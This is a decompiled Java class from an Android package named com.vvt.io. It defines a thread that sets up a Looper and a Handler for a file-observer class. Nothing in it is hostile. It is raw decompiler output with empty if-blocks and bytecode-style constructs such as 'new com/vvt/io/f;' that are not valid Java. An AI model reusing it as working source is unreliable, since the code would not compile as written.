package com.vvt.io;

import android.os.Handler;
import android.os.Looper;

class e
  extends Thread
{
  e(FxFileObserver paramFxFileObserver, String paramString)
  {
    super(paramString);
  }
  
  public void run()
  {
    boolean bool = FxFileObserver.c();
    if (bool) {}
    Looper.prepare();
    FxFileObserver localFxFileObserver = this.a;
    Object localObject = Looper.myLooper();
    FxFileObserver.a(localFxFileObserver, (Looper)localObject);
    bool = FxFileObserver.c();
    if (bool) {}
    localFxFileObserver = this.a;
    localObject = new com/vvt/io/f;
    ((f)localObject).<init>(this);
    FxFileObserver.a(localFxFileObserver, (Handler)localObject);
    bool = FxFileObserver.c();
    if (bool) {}
    Looper.loop();
    bool = FxFileObserver.c();
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/io/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */